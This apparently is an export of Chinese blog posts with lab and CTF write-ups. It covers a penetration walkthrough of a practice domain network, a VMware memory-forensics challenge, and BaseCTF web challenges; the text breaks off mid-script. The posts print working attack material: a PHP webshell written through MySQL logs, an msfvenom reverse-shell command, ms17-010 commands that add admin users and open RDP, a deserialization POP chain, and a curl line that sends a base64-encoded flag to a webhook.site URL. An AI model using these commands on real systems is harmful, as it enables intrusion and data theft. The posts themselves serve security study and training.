[{"content":"1.环境搭建 参考以下文章,不做过多叙述\n\u0026lt;https://blog.csdn.net/m0_46363249/article/details/121441832\n2.拓扑图和机器信息 3.打点 端口扫描发现80站点和3306mysql服务\n访问http发现phpstudy探针\n使用hydra发现无法连接\n截包尝试爆破发现一个异常长度\n返回包看不出什么,到web界面手动输入root,root发现连接正常说明存在弱口令root/root\n尝试连接发现不允许从外部连接\n掏出82年的笔记,按理说phpstudy搭建应该有phpadmin\n访问路径发现的确存在\n使用弱口令root/root成功进入\n发现是能够执行sql语句的\n接下来我们尝试利用mysql 写入webshell\n1 2 3 4 5 6 7 8 #mysql写入webshell需要的条件 1.mysql用户为root或dba赋权较高用户 2.有写入权限(FILE) 3.知道网站的绝对路径 4.服务器配置secure_file_priv 该选项为空代表可以写入任何目录 该选项如果有目录则代表只允许写入该目录下文件 该选项为null代表没有权限 查询\u0026quot;secure_file_priv\u0026quot;\n发现为null就是没有写入权限\n查询一下日志功能,尝试利用日志getshell\n关闭了但是我们可以手动开启,输入sql语句SET GLOBAL general_log = ON;执行成功开启\n我这里偷窥了一下站点目录,这个应该记住!\n接下来的思路是设置日志文件写到一个php文件中,SET GLOBAL general_log_file = 'C:/phpstudy/WWW/test.php';\n1 2 #这里前面不能加@ select \u0026#39;\u0026lt;?php eval($_POST[gucheng]);?\u0026gt;\u0026#39;; 进来后发现还有个网站yxcms,我们练习都打一下\n棱洞扫了下发现这cms就叫这个\n查看网页源代码发现默认口令\n到指定路径输入默认口令成功登入,修改模版index_index.php\n写入一句马\n蚁剑成功连接\n4.内网渗透 之前一直内网手渗透,下面就用cs操作了,主要是内网信息收集插件方便点\n将生成马上传到站点目录下运行上线\nladon插件 icmp检测主机存活一致\n发现存在域环境,域名为god.org\nladon infoscan整个网段确实如此\n现在是administrator权限,可以尝试提到system权限\n上传个nc到c:\\windows\\temp目录\n弹过来没反应\nmimikatz抓取到密码\n尝试用psexec连接也不行\n查看一下系统信息,打了什么补丁\n使用梼杌中的ms14-058提权成功\n上面搞的好像是有点问题,Windows应该是3389远程桌面连接,重新搞下\n执行netstat -ano未发现3389端口开启\n1 2 3 4 5 6 通过以下命令查询注册表来查看 RDP 服务是否开启： REG QUERY \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026#34; /v fDenyTSConnections # 查看RDP服务是否开启: 1关闭, 0开启 REG QUERY \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\ WinStations\\RDP-Tcp\u0026#34; /v PortNumber # 查看 RDP 服务的端口 为1关闭\n使用命令REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026quot; \u0026quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f手动开启\n为0成功开启\n再使用命令配置一下防火墙允许连接\n1 netsh advfirewall firewall add rule name=\u0026#34;Remote Desktop\u0026#34; protocol=TCP dir=in localport=3389 action=allow 接下来可以使用kali自带的xfreerdp进行连接,我这里为了后期渗透方便选择msf的\n先使用msfvenom组件生成一个马\n1 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.52.128 lport=4444 -f exe -o /root/Desktop/shell.exe 传上去执行后拿到meterpreter会话\n提权到system\n1 2 3 run post/windows/manage/enable_rdp #开启远程桌面 会生成一个文件，该文件可用来 再关闭远程桌面 run multi_console_command -r 文件地址 接下来做域内信息收集准备横向\n输入net view发现另外两台主机\n汇总一下信息\n1 2 3 4 5 6 7 8 9 10 域名:god.org 域控:OWA 域内用户三个: Administrator ligang liukaifeng01 域内主机三台: STU1(win7) 192.168.52.143 OWA 192.168.52.138 ROOT-TVI862UBEH 192.168.52.141 4.1 使用proxychains代理: 添加内网路由 run autoroute -s 192.168.52.0/24，查看一下arp缓存表存在52网段\nbackground返回一下,使用socks代理模块\n1 2 3 4 5 6 7 8 msf6 auxiliary(server/socks_proxy) \u0026gt; use auxiliary/server/socks_proxy msf6 auxiliary(server/socks_proxy) \u0026gt; show options msf6 auxiliary(server/socks_proxy) \u0026gt; set VERSION 5 VERSION =\u0026gt; 5 msf6 auxiliary(server/socks_proxy) \u0026gt; set username admin username =\u0026gt; admin msf6 auxiliary(server/socks_proxy) \u0026gt; set password admin msf6 auxiliary(server/socks_proxy) \u0026gt; run 重新开个终端vim /etc/proxychains.conf,如下配置\n返回msf6,输入proxychains curl http://192.168.52.143/yxcms/index.php,测试可以成功访问192.168.52.0网段\n4.2 CS直接建立socks5代理 右键点击机器-\u0026gt;代理转发-\u0026gt;socks代理,发现是62549端口\nproxifier检测成功,还是这个更方便点\n再在代理规则选择刚才那个即可\n4.3 渗透同域主机192.168.52.141 proxychains nmap -Pn 192.168.52.141\n通过445smb端口检测操作系统为Windows server2003,proxychains nmap -sV 192.168.52.141 -p 445\n搜了一下2003全是永恒之蓝\n先用第三个模块检测一下\n直接使用msf里面的攻击模块了(ms17-010)发现接收不了session,使用msf的代理之后就不能使用反向shell了，我们需要使用正向shell。\n换用这个代码执行试试use auxiliary/admin/smb/ms17_010_command\n代码成功运行\n接下来执行如下命令\n1 2 3 4 5 6 set command net user gucheng !@#123qwe!@# /add #添加用户 run set command net localgroup administrators gucheng /add #管理员权限 run set command \u0026#39;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\u0026#39;\t#开启rdp run 使用rdesktop连接proxychains rdesktop 192.168.52.141\n连接成功\nmsf设置正反向shell都打不通不知道为啥,登个远程桌面算了\n4.4 打域控 扫描端口,发现445又开启了\n接下来执行如下命令\n1 2 3 4 5 6 7 8 set command net user gucheng2 !@#123qwe!@# /add #添加用户 run set command net localgroup administrators gucheng2 /add #管理员权限 run set command netsh advfirewall firewall add rule name=\u0026#34;Remote Desktop\u0026#34; protocol=TCP dir=in localport=3389 action=allow\t#开启防火墙端口 run set command \u0026#39;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\u0026#39;\t#开启rdp run 创建成功\nproxychains rdesktop 192.168.52.138 发现连接不了,端口filtered,裂开,这个msf的模块打不通不知道啥原因,以后再研究艹\n","date":"2024-12-08T12:19:00+08:00","permalink":"http://gucheng.me/p/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/","title":"红日内网靶场1"},{"content":"目前做过的内存取证题不多,这道题难度较高具有启发意义,所以记录一下留作以后参照\n复现地址:\u0026lt;[陇剑杯 2021]机密内存（问1） | NSSCTF\u0026gt;\n知识了解之vmware虚拟机文件类型 思考过程 解压后拿到三个文件,vmem为分页备份文件, 其余两个文件类型暂时不清楚. 先尝试提取发现果然是不行的\n接下来看看另外两个文件\n打开Encryption.bin01发现为一个二进制文件\n根据文件大小数千kb和本地的vmss文件(虚拟机挂起时记录状态的文件)进行对比判断Encryption.bin01为vmss文件\n将Encryption.bin01文件重命名为mem_secret-963a4663.vmss，vmss文件的文件名一定要和vmem文件名对应，否则无法读取挂起的状态\n然后打开Encryption.bin02文件发现一半是某种加密可见字符串,另一半出现较多乱码\n将后半中的未加密字符串进行搜索发现提到加密和vmx文件\n打开本地kali的vmx文件发现是一些配置,由此看来是对配置信息进行了加密\n拿我本地另一台机器加密实验一下\n加密后打开确实发现大量加密字符串,但是头部发现了一些信息是bin02文件没有的,判断部分关键信息被出题人删了,我们需要进行修复. 还有在vmx加密文件中未发现不可见字符串,所以判断bin02文件后半部分是另外一个文件\n使用010将后半段单独提出来到一个16进制文本,\n将关键字lsilogic丢入gpt,因为我们已经判断出前半部分为vmx文件,所以我们与vmdk文件作对比看看\n经过比对发现大量相似特征,010导出后命名为vmem文件名+vmdk\n注意: 这里一定要摆脱刻板印象,不是所有vmdk文件都很大!\n接下来就是修复vmx文件然后尝试挂载该虚拟机然后解除加密即可得到明文文件进行内存取证\n以下地方需要进行修复, 按照本地加密的样本来进行修复bin02文件\n上面已经将后半部分提取出去, 直接改为vmx文件, 至此完成修复工作\n解除密码保护 吐了这里,开始少打了一个空格一直导不进去md\nvmx文件内容\n1 2 3 4 .encoding = \u0026#34;GBK\u0026#34; displayName = \u0026#34;buzhidao\u0026#34; encryption.keySafe = \u0026#34;vmware:key/list/(pair/(phrase/Dg7Se8rqkNI%3d/pass2key%3dPBKDF2%2dHMAC%2dSHA%2d1%3acipher%3dAES%2d256%3arounds%3d10000%3asalt%3d%2b21PdYUqEQd1wdT2AoPEQw%253d%253d,HMAC%2dSHA%2d1,CgKwC5U7lfLjpVohwbpxufC11yU4a0%2byrP08oY0KDDcP1NL%2fRiLojwTz2JnYqm7baAhtgENYUeFUHXwODjSClaJ%2bSRBhKw6UwET6p3AYK8vs4T0cBrvTjYSrs0baLgG7dozcvL5JxA%2fKYJvriz4Mf%2bMmVvE%3d))\u0026#34; encryption.data =\u0026#34;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\u0026#34; 提示虚拟机加密, 可以使用这个项目来尝试破解密码https://github.com/axcheron/pyvmx-cracker\n命令:\npython39 .\\pyvmx-cracker.py -v mem_secret.vmx -d wordlist.txt\n得到密码:1q2w3e4r\n接下来就是移除加密\n结果却发现无法移除加密,磁盘问题,说明vmdk文件仍然存在问题\n恢复vmdk 这个界面很明显是win10\n通过之前的比对我们现在需要一个合法的文件头与填充。所以重新创建一个win10虚拟机，此时并不需要去安装win10系统（因为我们的目的只是获取到正确的vmdk文件，VMware在我们安装系统前便已经为我们生成），再用任意的密码加密这个win10虚拟机得到同一密码加密后的完整的vmdk文件，试着用得到的完整的vmdk文件修复原来那个分离出来的残缺vmdk\nwin10 iso镜像下载点https://www.microsoft.com/zh-cn/software-download/windows10\n下载步骤如下:\n坑1 新建一个Win10虚拟机,这里有个坑，记录一下：我们发现这里不能选择拆分成多个文件，否则会导致有多个vmdk，同时内部格式也会与单个vmdk有所不同，最后也试过无法移除加密。\n除了下面这个其他全部默认就好, 磁盘不够的话给个30就行,不用装系统\n选择15系的\n进行加密,我还是用的相同的密码:1q2w3e4r\n打开题目附件里的损坏vmdk将0x18前的部分全部删除\n接下来找到本地的win10 vmdk文件拖入010\n找到偏移地址0x200处, 将光标移到0x18前面, 然后通过左上角 “编辑-插入/覆盖-覆盖文件\u0026quot;选取破损vmdk覆盖\n覆盖后在偏移地址0x220处覆盖字节为vmware达成格式\n覆盖后:\n接着重命名此vmdk文件，此时虚拟机修复完成，将其放到被加密的虚拟机目录下。\n这里还有个坑：修复完成后不要试图开启虚拟机，否则vmem文件会被删除。\n在访问控制中移除加密成功\n内存取证 终于成功加载了!\n这道题好像只能用vol3,vol2不行\n问1 取证人员首先对容器的基本信息进行核实，经过确定该容器的基本信息为________。（答案为32位小写md5(容器操作系统系统的版本号+容器主机名+系统用户名），例如：操作系统的版本号为10.0.22449，容器主机名为DESKTOP-0521,系统登录用户名为admin，则该题答案为32位小写md5(10.0.22449DESKTOP-0521admin) 的值ae278d9bc4aa5ee84a4aed858d17d52a)。得到的flag请使用NSSCTF{}格式提交。\n利用一把梭工具得到主机名和用户\n还是导出注册表然后使用wrr工具分析注册表\n将10.0.18363DESKTOP-4N21ET2Adomd5加密后得到flag\n然而提交不对,看官方wp里面是6.3.18362 , 不知道哪出了问题\n问2 黑客入侵容器后曾通过木马控制端使用Messagebox发送过一段信息，该信息的内容是____________。（答案为Messagebox信息框内内容）。得到的flag请使用NSSCTF{}格式提交。\n挂起页面已经显示出来了, Best_hacker\n问3 经过入侵分析发现该容器受到入侵的原因为容器使用人的违规进行游戏的行为，该使用人进行游戏程序的信息是__________。（答案为“32位小写md5(游戏程序注册邮箱+游戏程序登录用户名+游戏程序登录密码)，例如：注册邮箱为adol@163.com,登录用户名为user,密码为user1234，则该题答案为” adol@163.comuseruser1234”的小写md5值5f4505b7734467bfed3b16d5d6e75c16)。得到的flag请使用NSSCTF{}格式提交。\n从快照和安装软件可以看到使用了steam\n拖到kali用正则搜索镜像中的邮箱\n命令:\nstrings mem_secret-963a4663.vmem | grep -E \u0026quot;[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}\u0026quot;\n发现邮箱john@uuf.me多次在路径中出现而且存在该邮箱命名的文件夹,多半为用户邮箱\n使用命令查找账号密码,拿到notepad++搜一下找到账号密码请求\nstrings mem_secret-963a4663.vmem -n 10 |grep -C 3 \u0026quot;password\u0026quot;\u0026gt;mem_secret-963a4663_output.txt\n将john@uuf.mejock_you1jock.2021 md5加密即可得到flag\n问4 经过入侵分析发现该容器曾被黑客植入木马控制的信息是_________。（答案为“32位小写md5(木马程序进程名+木马回连ip地址+木马回连ip端口）”，例如：木马程序进程名为svhost.exe，木马回连ip为1.1.1.1，木马回连端口为1234，则该题答案为“svhost.exe1.1.1.11234”的32位小写md5值f02da74a0d78a13e7944277c3531bbea)。得到的flag请使用NSSCTF{}格式提交\n根据第三题可以判断是攻击者通过映像劫持等技术造成机主在启动steam的时候马儿也生效了,我就直接先看异常对外连接再看进程了,因为进程多半伪装了没那么好找\n发现异常对外连接,确定ip为192.168.241.147,回连端口为8808\n进程列表搜索steam,玩过steam的都知道steam.exe还有很多其他服务比如steamhelper\n第二个steam.exe单一个进程, 判断此进程为异常进程\n将steam.exe192.168.241.1478808MD5加密得到flag\n问5 经过入侵分析，发现黑客曾经运行过痕迹清除工具，该工具运行的基本信息是________。（答案为“32为小写md5”(痕迹清除工具执行程序名+最后一次运行时间)，例如：黑客运行工具执行程序名为run.exe，运行时间为2021-07-10 10:10:13，则本题的答案为小写的32位md5(run.exe2021-07-10 10:10:13) 值为82d7aa7a3f1467b973505702beb35769，注意：本题中运行时间的格式为yy-mm-dd hh:mm:ss，时间时区为UTC+8）。得到的flag请使用NSSCTF{}格式提交。\n最后这个用vol3找不出,vol2.6跑不了,看官方wp用的2.61,直接丢答案了\n1 python2 vol.py -f mem_secret-963a4663.vmem --profile=Win10x64_18362 userassist 答案为md5(Wywz.exe2021-09-1021:10:13)\nd46586ca847e6be1004037bc288bf60c\n","date":"2024-11-30T12:56:25+08:00","permalink":"http://gucheng.me/p/%E9%99%87%E5%89%91%E6%9D%AF2021%E6%9C%BA%E5%AF%86%E5%86%85%E5%AD%98%E5%A4%8D%E7%8E%B0/","title":"[陇剑杯2021]机密内存复现"},{"content":"[Week2] Really EZ POP 这道题记录一下的原因是因为这个php版本太低导致我们不能通过更改成员变量的属性来构造pop利用链，开始我就犯了这个错。不能改变属性但可以使用在类内部写入构造方法来构造链子\nwp如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 error_reporting(0); class Sink { private $cmd = \u0026#39;echo 123;\u0026#39;; public function __construct() { $this-\u0026gt;cmd = \u0026#39;system(\\\u0026#39;cat /flag\\\u0026#39;);\u0026#39;; } public function __toString() { eval($this-\u0026gt;cmd); } } class Shark { private $word = \u0026#39;Hello, World!\u0026#39;; public function __construct() { $this-\u0026gt;word = new Sink(); } public function __invoke() { echo \u0026#39;Shark says:\u0026#39; . $this-\u0026gt;word; } } class Sea { public $animal; public function __construct() { $this-\u0026gt;animal = new Shark(); } public function __get($name) { $sea_ani = $this-\u0026gt;animal; echo \u0026#39;In a deep deep sea, there is a \u0026#39; . $sea_ani(); } } class Nature { public $sea; public function __construct() { $this-\u0026gt;sea = new Sea(); } public function __destruct() { echo $this-\u0026gt;sea-\u0026gt;see; } } $ser = new Nature(); echo urlencode(serialize($ser)); [Week2] 所以你说你懂 MD5? 这道题当时是真不会哈希长度扩展攻击，题目源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 \u0026lt;?php session_start(); highlight_file(__FILE__); // 所以你说你懂 MD5 了? $apple = $_POST[\u0026#39;apple\u0026#39;]; $banana = $_POST[\u0026#39;banana\u0026#39;]; if (!($apple !== $banana \u0026amp;\u0026amp; md5($apple) === md5($banana))) { die(\u0026#39;加强难度就不会了?\u0026#39;); } // 什么? 你绕过去了? // 加大剂量! // 我要让他成为 string $apple = (string)$_POST[\u0026#39;appple\u0026#39;]; $banana = (string)$_POST[\u0026#39;bananana\u0026#39;]; if (!((string)$apple !== (string)$banana \u0026amp;\u0026amp; md5((string)$apple) == md5((string)$banana))) { die(\u0026#39;难吗?不难!\u0026#39;); } // 你还是绕过去了? // 哦哦哦, 我少了一个等于号 $apple = (string)$_POST[\u0026#39;apppple\u0026#39;]; $banana = (string)$_POST[\u0026#39;banananana\u0026#39;]; if (!((string)$apple !== (string)$banana \u0026amp;\u0026amp; md5((string)$apple) === md5((string)$banana))) { die(\u0026#39;嘻嘻, 不会了? 没看直播回放?\u0026#39;); } // 你以为这就结束了 if (!isset($_SESSION[\u0026#39;random\u0026#39;])) { $_SESSION[\u0026#39;random\u0026#39;] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)); } // 你想看到 random 的值吗? // 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧 $random = $_SESSION[\u0026#39;random\u0026#39;]; echo md5($random); echo \u0026#39;\u0026lt;br /\u0026gt;\u0026#39;; $name = $_POST[\u0026#39;name\u0026#39;] ?? \u0026#39;user\u0026#39;; // check if name ends with \u0026#39;admin\u0026#39; if (substr($name, -5) !== \u0026#39;admin\u0026#39;) { die(\u0026#39;不是管理员也来凑热闹?\u0026#39;); } $md5 = $_POST[\u0026#39;md5\u0026#39;]; if (md5($random . $name) !== $md5) { die(\u0026#39;伪造? NO NO NO!\u0026#39;); } // 认输了, 看样子你真的很懂 MD5 // 那 flag 就给你吧 echo \u0026#34;看样子你真的很懂 MD5\u0026#34;; echo file_get_contents(\u0026#39;/flag\u0026#39;); 第一个比较可以利用传入数组，因为md5函数不能处理数组返回null，两个null自然相等\n第二个比较是弱比较，我们可以利用科学计数法0e开头的字符串传参进行绕过\n第三个比较用了string强制类型转换，我们可以使用工具fastcoll生成两个md5值相同的字符串，原理就是原本payload字符串中含有多种空白符号，MD5加密后hash值相等(空白符号不影响md5值)。但是我们上传参数时会自动进行一次url解码，这样过后因为空白字符两个url就不相等了，从而成功绕过，也可以上网找一些相等的，我这里给出一组\n1 2 3 a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 \u0026amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 后面的知识就涉及到哈希长度拓展攻击了\n参考文章: https://luoingly.top/post/md5-length-extension-attack/\nhttps://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html\n全局变量random长度为96\n而name由我们传入可控，后面还会和md5($random)拼接，我们可以构造payload进行填充让新建一个分组包含后面需要验证的admin\n这里使用工具生成了，我是菜比\n先输入random的文本长度，然后是random的hash，最后是我们希望拓展的字符串\n生成后选择url编码一次的payload，浏览器会自动对我们传递的参数进行一次解码。\n然后再传入新的hash，虽然字符串上看起来不一样，但在md5分组运算的时候是一样的，所以两个md5判断为相等，由此拿到flag\n[Week2] 你听不到我的声音 这道题是一个无回显的RCE利用，方法有很多种\n重定向到文件 导入到txt文件我们就可以进行访问了\n1 cat/cp/mv /flag \u0026gt; 1.txt 利用curl命令和[webhook](Webhook.site - Test, transform and automate Web requests and emails)进行信息外带出flag payload\n1 curl https://webhook.site/44f66666-8c8a-47bd-978a-84f7a596c7ff/`cat /flag | base64` 直接写马 写马, 用 wget, curl 下载木马然后webshell管理工具连接\n[Week2] 数学大师 这道题我就只贴脚本了\n我的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import re import requests s = requests.Session() # 使用Session对象 url = \u0026#39;http://challenge.basectf.fun:37945/\u0026#39; res = s.get(url=url) #get请求如果放到循环体相等于打开五十个页面了，我们只需在循环体里更新用于匹配计算式的文本即可 string = res.text for i in range(50): # 提取算术表达式 pattern = r\u0026#39;second ([\\d×÷+-/]+)\u0026#39; matches = re.findall(pattern, string) expression = matches[0].replace(\u0026#39;×\u0026#39;, \u0026#39;*\u0026#39;).replace(\u0026#39;÷\u0026#39;, \u0026#39;/\u0026#39;) # 计算表达式 result = int(eval(expression)) r = s.post(url=url, data={\u0026#39;answer\u0026#39;: result}) print(r.text) # 更新页面内容 string = r.text 官方wp的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import requests import re req = requests.session() url = \u0026#34;http://challenge.basectf.fun:24989/\u0026#34; answer = 0 while True: response = req.post(url , data={\u0026#34;answer\u0026#34;: answer}) print(response.text) if \u0026#34;BaseCTF\u0026#34; in response.text: print(response.text) break regex = r\u0026#34; (\\d*?)(.)(\\d*)\\?\u0026#34; match = re.search(regex, response.text) if match.group(2) == \u0026#34;+\u0026#34;: answer = 